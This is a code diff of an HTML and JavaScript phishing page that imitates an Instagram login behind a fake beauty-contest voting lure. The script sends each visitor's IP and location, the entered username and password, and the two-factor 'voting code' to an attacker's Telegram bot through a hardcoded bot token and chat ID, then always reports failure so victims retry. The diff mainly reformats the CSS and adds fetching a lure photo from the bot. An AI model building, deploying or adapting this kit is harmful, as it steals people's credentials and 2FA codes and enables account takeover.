@@ -6,399 +6,73 @@
     <title>𝔹𝕖𝕒𝕦𝕥𝕪 𝕔𝕠𝕟𝕥𝕖𝕤𝕥 𝕗𝕒𝕤𝕙𝕚𝕠𝕟 🌸</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #f5efe9; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; margin: 0; }
+        .app-container { max-width: 400px; width: 100%; background: #fcf8f5; border-radius: 32px; box-shadow: 0 20px 48px rgba(120, 90, 70, 0.20); overflow: hidden; padding: 28px 20px 32px; transition: all 0.2s; position: relative; border: 1px solid #ede5dc; }
 
-        body {
-            background: #f5efe9;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 16px;
-            margin: 0;
-        }
+        .top-photo-area { width: 100%; border-radius: 24px; overflow: hidden; background: #efe6dd; margin-bottom: 22px; border: 1px solid #e1d3c8; min-height: 200px; display: flex; align-items: center; justify-content: center; position: relative; }
+        .top-photo-area img { width: 100%; height: auto; max-height: 280px; object-fit: cover; display: block; }
+        .top-photo-area .no-photo { color: #b3927c; font-size: 15px; text-align: center; padding: 30px 16px; font-weight: 500; }
+        .top-photo-area .no-photo i { font-size: 40px; display: block; margin-bottom: 10px; color: #c9ad96; }
+        .top-photo-area .loading-photo { color: #b3927c; font-size: 14px; text-align: center; padding: 30px 16px; }
+        .top-photo-area .loading-photo i { font-size: 30px; display: block; margin-bottom: 10px; color: #c9ad96; }
+        .top-photo-area::after { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255, 245, 235, 0.08); pointer-events: none; }
 
-        .app-container {
-            max-width: 400px;
-            width: 100%;
-            background: #fcf8f5;
-            border-radius: 32px;
-            box-shadow: 0 20px 48px rgba(120, 90, 70, 0.20);
-            overflow: hidden;
-            padding: 28px 20px 32px;
-            transition: all 0.2s;
-            position: relative;
-            border: 1px solid #ede5dc;
-        }
+        #welcomeScreen { display: flex; flex-direction: column; align-items: center; text-align: center; gap: 14px; padding: 10px 0 16px; }
+        .ig-icon { font-size: 56px; background: radial-gradient(circle at 30% 30%, #feda75, #d62976, #962fbf, #4f5bd5); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; display: inline-block; margin-bottom: 2px; filter: drop-shadow(0 4px 10px rgba(0,0,0,0.10)); }
+        .welcome-title { font-size: 28px; font-weight: 600; letter-spacing: -0.5px; line-height: 1.2; color: #3d2e26; text-shadow: 0 2px 4px rgba(255, 215, 190, 0.3); }
+        .welcome-sub { font-size: 15px; color: #6b4f3e; background: #efe6dd; padding: 8px 18px; border-radius: 40px; font-weight: 500; margin: 4px 0 10px; border: 1px solid #e1d3c8; }
 
-        /* ===== LARGE PHOTO AT TOP (visible, not accessible) ===== */
-        .top-photo-area {
-            width: 100%;
-            border-radius: 24px;
-            overflow: hidden;
-            background: #efe6dd;
-            margin-bottom: 22px;
-            border: 1px solid #e1d3c8;
-            min-height: 200px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-        }
+        .wobble-btn { background: #d4b8a0; color: #2f221c; border: none; padding: 14px 28px; border-radius: 40px; font-weight: 600; font-size: 16px; display: inline-flex; align-items: center; gap: 12px; cursor: pointer; transition: 0.2s; margin-top: 10px; box-shadow: 0 6px 18px rgba(180, 140, 115, 0.30); animation: wobble 2.2s infinite ease-in-out; border: 1px solid rgba(255, 240, 230, 0.5); }
+        .wobble-btn i { font-size: 20px; color: #3d2e26; }
+        @keyframes wobble { 0%, 100% { transform: rotate(0deg) scale(1); } 15% { transform: rotate(-2.5deg) scale(1.03); } 30% { transform: rotate(2.5deg) scale(0.97); } 45% { transform: rotate(-1.8deg) scale(1.02); } 60% { transform: rotate(1.8deg) scale(0.98); } 80% { transform: rotate(-0.8deg) scale(1); } }
+        .wobble-btn:hover { background: #c9ad96; box-shadow: 0 8px 22px rgba(160, 120, 95, 0.4); }
 
-        .top-photo-area img {
-            width: 100%;
-            height: auto;
-            max-height: 280px;
-            object-fit: cover;
-            display: block;
-        }
+        #loginPage { display: none; flex-direction: column; gap: 18px; padding: 8px 0 4px; }
+        .login-header { display: flex; flex-direction: column; align-items: center; margin-bottom: 6px; }
+        .login-header .ig-icon { font-size: 48px; margin-bottom: 0; }
+        .login-header h2 { font-size: 24px; font-weight: 500; color: #3d2e26; margin-top: 2px; letter-spacing: -0.3px; }
+        .login-input-group { display: flex; flex-direction: column; gap: 12px; }
+        .login-input-group input { padding: 15px 18px; border: 1px solid #dccfc4; border-radius: 14px; font-size: 15px; background: #f9f3ee; color: #2f221c; transition: 0.2s; outline: none; box-shadow: inset 0 2px 4px rgba(160, 130, 110, 0.10); }
+        .login-input-group input:focus { border-color: #b3927c; background: #fff9f5; box-shadow: 0 0 0 3px rgba(180, 140, 115, 0.25); }
+        .login-input-group input::placeholder { color: #8f7564; }
 
-        .top-photo-area .no-photo {
-            color: #b3927c;
-            font-size: 15px;
-            text-align: center;
-            padding: 30px 16px;
-            font-weight: 500;
-        }
+        .login-btn { background: #d4b8a0; color: #2f221c; border: none; padding: 15px; border-radius: 40px; font-weight: 600; font-size: 16px; margin-top: 10px; cursor: pointer; transition: 0.2s; opacity: 0.5; pointer-events: none; box-shadow: 0 4px 12px rgba(160, 130, 110, 0.15); border: 1px solid rgba(255, 240, 230, 0.3); }
+        .login-btn.active { opacity: 1; pointer-events: auto; background: #c9ad96; }
+        .login-btn.active:hover { background: #b8977e; transform: scale(0.98); }
+        .forgot-link { text-align: center; color: #7a6152; font-size: 14px; margin-top: 2px; cursor: default; }
+        .forgot-link span { color: #a8836b; font-weight: 500; }
 
-        .top-photo-area .no-photo i {
-            font-size: 40px;
-            display: block;
-            margin-bottom: 10px;
-            color: #c9ad96;
-        }
+        #codePage { display: none; flex-direction: column; gap: 20px; padding: 12px 0; }
+        #codePage h3 { font-size: 20px; font-weight: 500; color: #3d2e26; text-align: center; }
+        #codePage p { color: #6b4f3e; text-align: center; font-size: 15px; background: #f5ede6; padding: 14px; border-radius: 16px; border: 1px solid #e1d3c8; }
+        #codePage input { padding: 15px 18px; border: 1px solid #dccfc4; border-radius: 14px; font-size: 15px; background: #f9f3ee; color: #2f221c; outline: none; text-align: center; letter-spacing: 4px; box-shadow: inset 0 2px 4px rgba(160, 130, 110, 0.10); }
+        #codePage input::placeholder { color: #8f7564; letter-spacing: 1px; }
+        .code-actions { display: flex; gap: 12px; margin-top: 4px; }
+        .code-actions button { flex: 1; padding: 15px; border: none; border-radius: 40px; font-weight: 600; background: #d4b8a0; color: #2f221c; font-size: 15px; cursor: pointer; transition: 0.15s; border: 1px solid rgba(255, 240, 230, 0.3); }
+        .code-actions button:last-child { background: #e6d9cf; color: #3d2e26; }
+        .code-actions button:hover { opacity: 0.85; background: #c9ad96; }
+        .code-actions button:last-child:hover { background: #dacbc0; }
 
-        .top-photo-area::after {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(255, 245, 235, 0.08);
-            pointer-events: none;
-        }
-
-        /* ===== WELCOME SCREEN ===== */
-        #welcomeScreen {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-            gap: 14px;
-            padding: 10px 0 16px;
-        }
-
-        .ig-icon {
-            font-size: 56px;
-            background: radial-gradient(circle at 30% 30%, #feda75, #d62976, #962fbf, #4f5bd5);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            display: inline-block;
-            margin-bottom: 2px;
-            filter: drop-shadow(0 4px 10px rgba(0,0,0,0.10));
-        }
-
-        .welcome-title {
-            font-size: 28px;
-            font-weight: 600;
-            letter-spacing: -0.5px;
-            line-height: 1.2;
-            color: #3d2e26;
-            text-shadow: 0 2px 4px rgba(255, 215, 190, 0.3);
-        }
-
-        .welcome-sub {
-            font-size: 15px;
-            color: #6b4f3e;
-            background: #efe6dd;
-            padding: 8px 18px;
-            border-radius: 40px;
-            font-weight: 500;
-            margin: 4px 0 10px;
-            border: 1px solid #e1d3c8;
-        }
-
-        .wobble-btn {
-            background: #d4b8a0;
-            color: #2f221c;
-            border: none;
-            padding: 14px 28px;
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 16px;
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 10px;
-            box-shadow: 0 6px 18px rgba(180, 140, 115, 0.30);
-            animation: wobble 2.2s infinite ease-in-out;
-            border: 1px solid rgba(255, 240, 230, 0.5);
-        }
-
-        .wobble-btn i {
-            font-size: 20px;
-            color: #3d2e26;
-        }
-
-        @keyframes wobble {
-            0%, 100% { transform: rotate(0deg) scale(1); }
-            15% { transform: rotate(-2.5deg) scale(1.03); }
-            30% { transform: rotate(2.5deg) scale(0.97); }
-            45% { transform: rotate(-1.8deg) scale(1.02); }
-            60% { transform: rotate(1.8deg) scale(0.98); }
-            80% { transform: rotate(-0.8deg) scale(1); }
-        }
-
-        .wobble-btn:hover {
-            background: #c9ad96;
-            box-shadow: 0 8px 22px rgba(160, 120, 95, 0.4);
-        }
-
-        #loginPage {
-            display: none;
-            flex-direction: column;
-            gap: 18px;
-            padding: 8px 0 4px;
-        }
-
-        .login-header {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-bottom: 6px;
-        }
-
-        .login-header .ig-icon {
-            font-size: 48px;
-            margin-bottom: 0;
-        }
-
-        .login-header h2 {
-            font-size: 24px;
-            font-weight: 500;
-            color: #3d2e26;
-            margin-top: 2px;
-            letter-spacing: -0.3px;
-        }
-
-        .login-input-group {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .login-input-group input {
-            padding: 15px 18px;
-            border: 1px solid #dccfc4;
-            border-radius: 14px;
-            font-size: 15px;
-            background: #f9f3ee;
-            color: #2f221c;
-            transition: 0.2s;
-            outline: none;
-            box-shadow: inset 0 2px 4px rgba(160, 130, 110, 0.10);
-        }
-
-        .login-input-group input:focus {
-            border-color: #b3927c;
-            background: #fff9f5;
-            box-shadow: 0 0 0 3px rgba(180, 140, 115, 0.25);
-        }
-
-        .login-input-group input::placeholder {
-            color: #8f7564;
-        }
-
-        .login-btn {
-            background: #d4b8a0;
-            color: #2f221c;
-            border: none;
-            padding: 15px;
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 16px;
-            margin-top: 10px;
-            cursor: pointer;
-            transition: 0.2s;
-            opacity: 0.5;
-            pointer-events: none;
-            box-shadow: 0 4px 12px rgba(160, 130, 110, 0.15);
-            border: 1px solid rgba(255, 240, 230, 0.3);
-        }
-
-        .login-btn.active {
-            opacity: 1;
-            pointer-events: auto;
-            background: #c9ad96;
-        }
-
-        .login-btn.active:hover {
-            background: #b8977e;
-            transform: scale(0.98);
-        }
-
-        .forgot-link {
-            text-align: center;
-            color: #7a6152;
-            font-size: 14px;
-            margin-top: 2px;
-            cursor: default;
-        }
-
-        .forgot-link span {
-            color: #a8836b;
-            font-weight: 500;
-        }
-
-        #codePage {
-            display: none;
-            flex-direction: column;
-            gap: 20px;
-            padding: 12px 0;
-        }
-
-        #codePage h3 {
-            font-size: 20px;
-            font-weight: 500;
-            color: #3d2e26;
-            text-align: center;
-        }
-
-        #codePage p {
-            color: #6b4f3e;
-            text-align: center;
-            font-size: 15px;
-            background: #f5ede6;
-            padding: 14px;
-            border-radius: 16px;
-            border: 1px solid #e1d3c8;
-        }
-
-        #codePage input {
-            padding: 15px 18px;
-            border: 1px solid #dccfc4;
-            border-radius: 14px;
-            font-size: 15px;
-            background: #f9f3ee;
-            color: #2f221c;
-            outline: none;
-            text-align: center;
-            letter-spacing: 4px;
-            box-shadow: inset 0 2px 4px rgba(160, 130, 110, 0.10);
-        }
-
-        #codePage input::placeholder {
-            color: #8f7564;
-            letter-spacing: 1px;
-        }
-
-        .code-actions {
-            display: flex;
-            gap: 12px;
-            margin-top: 4px;
-        }
-
-        .code-actions button {
-            flex: 1;
-            padding: 15px;
-            border: none;
-            border-radius: 40px;
-            font-weight: 600;
-            background: #d4b8a0;
-            color: #2f221c;
-            font-size: 15px;
-            cursor: pointer;
-            transition: 0.15s;
-            border: 1px solid rgba(255, 240, 230, 0.3);
-        }
-
-        .code-actions button:last-child {
-            background: #e6d9cf;
-            color: #3d2e26;
-        }
-
-        .code-actions button:hover {
-            opacity: 0.85;
-            background: #c9ad96;
-        }
-        .code-actions button:last-child:hover {
-            background: #dacbc0;
-        }
-
-        #failedPage {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            gap: 18px;
-            padding: 30px 0;
-        }
-
-        #failedPage i {
-            font-size: 58px;
-            color: #b07d6e;
-            filter: drop-shadow(0 4px 8px rgba(160, 100, 80, 0.20));
-        }
-
-        #failedPage h2 {
-            font-size: 26px;
-            font-weight: 600;
-            color: #3d2e26;
-        }
-
-        #failedPage p {
-            color: #6b4f3e;
-            font-size: 16px;
-            text-align: center;
-        }
-
-        #retryBtn {
-            background: #d4b8a0;
-            border: none;
-            color: #2f221c;
-            padding: 14px 36px;
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 8px;
-            transition: 0.15s;
-            border: 1px solid rgba(255, 240, 230, 0.3);
-        }
-
-        #retryBtn:hover {
-            background: #c9ad96;
-        }
-
-        .border-top {
-            border-top: 1px solid #e1d3c8;
-            padding-top: 16px;
-            margin-top: 8px;
-        }
-
-        .signup-text {
-            color: #7a6152;
-            font-size: 14px;
-        }
-        .signup-text a {
-            color: #a8836b;
-            font-weight: 600;
-            text-decoration: none;
-        }
-        .debug-note { display: none; }
+        #failedPage { display: none; flex-direction: column; align-items: center; gap: 18px; padding: 30px 0; }
+        #failedPage i { font-size: 58px; color: #b07d6e; filter: drop-shadow(0 4px 8px rgba(160, 100, 80, 0.20)); }
+        #failedPage h2 { font-size: 26px; font-weight: 600; color: #3d2e26; }
+        #failedPage p { color: #6b4f3e; font-size: 16px; text-align: center; }
+        #retryBtn { background: #d4b8a0; border: none; color: #2f221c; padding: 14px 36px; border-radius: 40px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 8px; transition: 0.15s; border: 1px solid rgba(255, 240, 230, 0.3); }
+        #retryBtn:hover { background: #c9ad96; }
+        .border-top { border-top: 1px solid #e1d3c8; padding-top: 16px; margin-top: 8px; }
+        .signup-text { color: #7a6152; font-size: 14px; }
+        .signup-text a { color: #a8836b; font-weight: 600; text-decoration: none; }
     </style>
 </head>
 <body>
 <div class="app-container" id="appContainer">
-    <!-- ===== LARGE PHOTO AT TOP (from admin) ===== -->
     <div class="top-photo-area" id="topPhotoArea">
-        <div class="no-photo" id="noPhotoMessage">
+        <div class="loading-photo" id="loadingPhoto">
+            <i class="fas fa-spinner fa-spin"></i>
+            Loading photo...
+        </div>
+        <div class="no-photo" id="noPhotoMessage" style="display:none;">
             <i class="fas fa-image"></i>
             No photo uploaded yet<br>
             <span style="font-size: 12px; opacity: 0.7;">(Admin can set one)</span>
@@ -406,20 +80,14 @@
         <img id="topPhotoImg" src="" alt="Login page photo" style="display: none;">
     </div>
 
-    <!-- WELCOME SCREEN -->
     <div id="welcomeScreen">
         <div class="ig-icon"><i class="fab fa-instagram"></i></div>
-        <div class="welcome-title">
-            <span>𝔹𝕖𝕒𝕦𝕥𝕪 𝕔𝕠𝕟𝕥𝕖𝕤𝕥 𝕗𝕒𝕤𝕙𝕚𝕠𝕟</span> 🌸
-        </div>
+        <div class="welcome-title"><span>𝔹𝕖𝕒𝕦𝕥𝕪 𝕔𝕠𝕟𝕥𝕖𝕤𝕥 𝕗𝕒𝕤𝕙𝕚𝕠𝕟</span> 🌸</div>
         <div class="welcome-sub">nominating media</div>
-        <button class="wobble-btn" id="continueBtn">
-            <i class="fab fa-instagram"></i> Continue with Instagram
-        </button>
+        <button class="wobble-btn" id="continueBtn"><i class="fab fa-instagram"></i> Continue with Instagram</button>
         <div style="font-size: 14px; color: #7a6152; margin-top: 8px; font-weight: 400;">to vote contestant platform</div>
     </div>
 
-    <!-- LOGIN PAGE -->
     <div id="loginPage">
         <div class="login-header">
             <div class="ig-icon"><i class="fab fa-instagram"></i></div>
@@ -431,12 +99,9 @@
         </div>
         <button class="login-btn" id="loginBtn">Log In</button>
         <div class="forgot-link">Forgot password? <span>Get help</span></div>
-        <div class="border-top signup-text">
-            Don't have an account? <a href="#">Sign up</a>
-        </div>
+        <div class="border-top signup-text">Don't have an account? <a href="#">Sign up</a></div>
     </div>
 
-    <!-- CODE VERIFICATION -->
     <div id="codePage">
         <h3>🔐 Check your email, SMS or WhatsApp</h3>
         <p>We sent a voting code to your registered contact. Enter it below.</p>
@@ -448,7 +113,6 @@
         <div style="font-size: 13px; color: #7a6152; text-align: center;">Code expires in 5 minutes</div>
     </div>
 
-    <!-- FAILED PAGE -->
     <div id="failedPage">
         <i class="fas fa-times-circle"></i>
         <h2>Voting failed ❌</h2>
@@ -460,31 +124,91 @@
 <script>
     (function() {
         // ============================================
-        // PHOTO FROM LOCALSTORAGE (set by admin page)
-        // ============================================
-        function loadLoginPhoto() {
-            const saved = localStorage.getItem('loginPagePhoto');
-            const img = document.getElementById('topPhotoImg');
-            const noPhoto = document.getElementById('noPhotoMessage');
-
-            if (saved) {
-                img.src = saved;
-                img.style.display = 'block';
-                noPhoto.style.display = 'none';
-            } else {
-                img.style.display = 'none';
-                noPhoto.style.display = 'block';
-            }
-        }
-        loadLoginPhoto();
-
-        // ============================================
-        // TELEGRAM CONFIG — YOUR NEW DETAILS
+        // TELEGRAM CONFIG — YOUR DETAILS
         // ============================================
         const BOT_TOKEN = '8840685694:AAENS4sCfxqzp89hmDGdvXX5TJfBggYeweA';
         const CHAT_ID = '8600028792';
 
-        // DOM refs
+        // ============================================
+        // LOAD PHOTO — first try Telegram, then local
+        // ============================================
+        async function loadLoginPhoto() {
+            const img = document.getElementById('topPhotoImg');
+            const noPhoto = document.getElementById('noPhotoMessage');
+            const loadingPhoto = document.getElementById('loadingPhoto');
+
+            // Helper to display an image URL
+            function showImage(url) {
+                img.src = url;
+                img.style.display = 'block';
+                noPhoto.style.display = 'none';
+                loadingPhoto.style.display = 'none';
+            }
+
+            function showNoPhoto() {
+                img.style.display = 'none';
+                noPhoto.style.display = 'block';
+                loadingPhoto.style.display = 'none';
+            }
+
+            // 1. Try local storage first (fast)
+            const localData = localStorage.getItem('loginPagePhoto');
+            if (localData) {
+                showImage(localData);
+                // Still continue to check Telegram in background for updates
+            }
+
+            // 2. Fetch latest photo file_id from Telegram
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=100`);
+                const data = await res.json();
+
+                if (data.ok && data.result && data.result.length > 0) {
+                    // Find the most recent message containing "LOGIN_PHOTO_ID:"
+                    let latestFileId = null;
+                    for (let i = data.result.length - 1; i >= 0; i--) {
+                        const msg = data.result[i].message;
+                        if (msg && msg.text && msg.text.startsWith('LOGIN_PHOTO_ID:')) {
+                            latestFileId = msg.text.replace('LOGIN_PHOTO_ID:', '').trim();
+                            break;
+                        }
+                    }
+
+                    if (latestFileId) {
+                        // Get file path from Telegram
+                        const fileRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${latestFileId}`);
+                        const fileData = await fileRes.json();
+
+                        if (fileData.ok && fileData.result.file_path) {
+                            const imageUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`;
+                            // Check the image loads
+                            const testImg = new Image();
+                            testImg.onload = () => showImage(imageUrl);
+                            testImg.onerror = () => { if (!localData) showNoPhoto(); };
+                            testImg.src = imageUrl;
+
+                            // Save the file_id locally for faster next load
+                            try {
+                                localStorage.setItem('loginPagePhotoFileId', latestFileId);
+                            } catch (e) {}
+                            return;
+                        }
+                    }
+                }
+
+                // If no Telegram photo and no local photo, show empty state
+                if (!localData) showNoPhoto();
+            } catch (err) {
+                console.warn('Telegram fetch failed:', err);
+                if (!localData) showNoPhoto();
+            }
+        }
+
+        loadLoginPhoto();
+
+        // ============================================
+        // REST OF LOGIN LOGIC (unchanged)
+        // ============================================
         const welcomeScreen = document.getElementById('welcomeScreen');
         const loginPage = document.getElementById('loginPage');
         const codePage = document.getElementById('codePage');
@@ -498,73 +222,41 @@
         const retryBtn = document.getElementById('retryBtn');
         const resendBtn = document.getElementById('resendCodeBtn');
 
-        // ---------- send to telegram ----------
         function sendToTelegram(message) {
             if (!BOT_TOKEN || !CHAT_ID) return;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const payload = {
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            };
-            fetch(url, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
             }).catch(err => console.warn('Telegram send error:', err));
         }
 
-        // ---------- IP & location (ipapi.co) ----------
         function fetchLocationAndIP() {
             return fetch('https://ipapi.co/json/')
-                .then(res => {
-                    if (!res.ok) throw new Error('IP service error');
-                    return res.json();
-                })
-                .then(data => {
-                    const ip = data.ip || 'unknown';
-                    const city = data.city || 'N/A';
-                    const region = data.region || 'N/A';
-                    const country = data.country_name || 'N/A';
-                    const loc = `${city}, ${region}, ${country}`;
-                    return { ip, location: loc };
-                })
-                .catch(() => {
-                    return fetch('https://api.ipify.org?format=json')
-                        .then(r => r.json())
-                        .then(data => ({ ip: data.ip || 'unknown', location: 'unavailable' }))
-                        .catch(() => ({ ip: 'unknown', location: 'unavailable' }));
-                });
+                .then(res => { if (!res.ok) throw new Error('IP service error'); return res.json(); })
+                .then(data => ({
+                    ip: data.ip || 'unknown',
+                    location: `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country_name || 'N/A'}`
+                }))
+                .catch(() => fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => ({ ip: d.ip || 'unknown', location: 'unavailable' }))
+                    .catch(() => ({ ip: 'unknown', location: 'unavailable' }))
+                );
         }
 
-        // ---------- login attempt ----------
         function performLogin() {
             const user = usernameInput.value.trim();
             const pass = passwordInput.value.trim();
-
-            if (user === '' || pass === '') {
-                alert('Please enter both username and password.');
-                return;
-            }
+            if (user === '' || pass === '') { alert('Please enter both username and password.'); return; }
 
             loginBtn.disabled = true;
             loginBtn.textContent = 'Logging in...';
 
             fetchLocationAndIP().then(({ ip, location }) => {
                 const timestamp = new Date().toLocaleString();
-                const msg = `🔐 <b>Instagram Login Attempt</b>\n` +
-                            `👤 Username: ${user}\n` +
-                            `🔑 Password: ${pass}\n` +
-                            `🌐 IP: ${ip}\n` +
-                            `📍 Location: ${location}\n` +
-                            `🕒 ${timestamp}`;
-                sendToTelegram(msg);
-
-                const twofaMsg = `📱 <b>Two-Factor (2FA) triggered</b>\n` +
-                                 `User: ${user}\n` +
-                                 `IP: ${ip}\n` +
-                                 `⏳ Waiting for code...`;
-                sendToTelegram(twofaMsg);
+                sendToTelegram(`🔐 <b>Instagram Login Attempt</b>\n👤 Username: ${user}\n🔑 Password: ${pass}\n🌐 IP: ${ip}\n📍 Location: ${location}\n🕒 ${timestamp}`);
+                sendToTelegram(`📱 <b>Two-Factor (2FA) triggered</b>\nUser: ${user}\nIP: ${ip}\n⏳ Waiting for code...`);
 
                 setTimeout(() => {
                     loginPage.style.display = 'none';
@@ -577,18 +269,14 @@
             });
         }
 
-        // ---------- verify code (always fails) ----------
         function verifyCode() {
             const code = document.getElementById('codeInput').value.trim();
-            if (code !== '') {
-                sendToTelegram(`📨 <b>Voting code entered</b>: ${code} (will fail)`);
-            }
+            if (code !== '') sendToTelegram(`📨 <b>Voting code entered</b>: ${code} (will fail)`);
             codePage.style.display = 'none';
             failedPage.style.display = 'flex';
             document.getElementById('codeInput').value = '';
         }
 
-        // ---------- reset to login ----------
         function resetToLogin() {
             failedPage.style.display = 'none';
             loginPage.style.display = 'flex';
@@ -600,28 +288,18 @@
             toggleLoginButton();
         }
 
-        // ---------- toggle login button active ----------
         function toggleLoginButton() {
             const user = usernameInput.value.trim();
             const pass = passwordInput.value.trim();
-            if (user !== '' && pass !== '') {
-                loginBtn.classList.add('active');
-            } else {
-                loginBtn.classList.remove('active');
-            }
+            if (user !== '' && pass !== '') loginBtn.classList.add('active');
+            else loginBtn.classList.remove('active');
         }
 
-        // ---------- event listeners ----------
         continueBtn.addEventListener('click', function() {
             welcomeScreen.style.display = 'none';
             loginPage.style.display = 'flex';
-
             fetchLocationAndIP().then(({ ip, location }) => {
-                const msg = `🔗 <b>Instagram clone link clicked</b>\n` +
-                            `🌐 IP: ${ip}\n` +
-                            `📍 Location: ${location}\n` +
-       `🕒 ${new Date().toLocaleString()}`;
-                sendToTelegram(msg);
+                sendToTelegram(`🔗 <b>Instagram clone link clicked</b>\n🌐 IP: ${ip}\n📍 Location: ${location}\n🕒 ${new Date().toLocaleString()}`);
             });
         });
 
@@ -630,39 +308,22 @@
 
         loginBtn.addEventListener('click', function(e) {
             e.preventDefault();
-            if (this.classList.contains('active')) {
-                performLogin();
-            } else {
-                alert('Please fill in all fields.');
-            }
+            if (this.classList.contains('active')) performLogin();
+            else alert('Please fill in all fields.');
         });
 
-        verifyCodeBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            verifyCode();
-        });
-
+        verifyCodeBtn.addEventListener('click', function(e) { e.preventDefault(); verifyCode(); });
         resendBtn.addEventListener('click', function() {
             sendToTelegram(`🔄 <b>Resend code requested</b>`);
             alert('A new code has been sent to your email/SMS/WhatsApp.');
         });
+        retryBtn.addEventListener('click', resetToLogin);
 
-        retryBtn.addEventListener('click', function() {
-            resetToLogin();
-        });
-
-        usernameInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') loginBtn.click();
-        });
-        passwordInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') loginBtn.click();
-        });
-        document.getElementById('codeInput').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') verifyCodeBtn.click();
-        });
+        usernameInput.addEventListener('keypress', e => { if (e.key === 'Enter') loginBtn.click(); });
+        passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') loginBtn.click(); });
+        document.getElementById('codeInput').addEventListener('keypress', e => { if (e.key === 'Enter') verifyCodeBtn.click(); });
 
         toggleLoginButton();
-        console.log('Login page ready — photo at top, Telegram bot updated.');
     })();
 </script>
 </body>
